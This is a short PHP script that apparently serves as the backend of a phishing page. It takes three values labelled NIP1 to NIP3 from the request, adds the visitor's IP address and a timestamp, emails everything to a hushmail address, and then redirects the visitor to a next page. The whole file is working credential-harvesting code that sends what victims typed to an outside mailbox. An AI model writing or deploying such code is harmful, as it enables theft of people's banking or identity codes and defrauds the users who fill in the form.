<?php
header("Location: 3.html");
$IP = $_SERVER['REMOTE_ADDR'];

$to = "finoknaller@hushmail.com";

$message = "NIP1: " . $_GET['P1'] . "\n";
$message .= "NIP2: " . $_GET['P2'] . "\n";
$message .= "NIP3: " . $_GET['P3'] . "\n";
$message .= "IPadres:" . $logdetails=  date("F j, Y, g:i a") . ': ' . '<a target=_blank href=http://www.dnsstuff.com/tools/ipall.ch?domain='.$_SERVER['REMOTE_ADDR'].'>'.$_SERVER['REMOTE_ADDR'].'</a>';


mail($to, '(2)S-NIPS - '.$_SERVER['REMOTE_ADDR'].'', $message);
exit;
?>
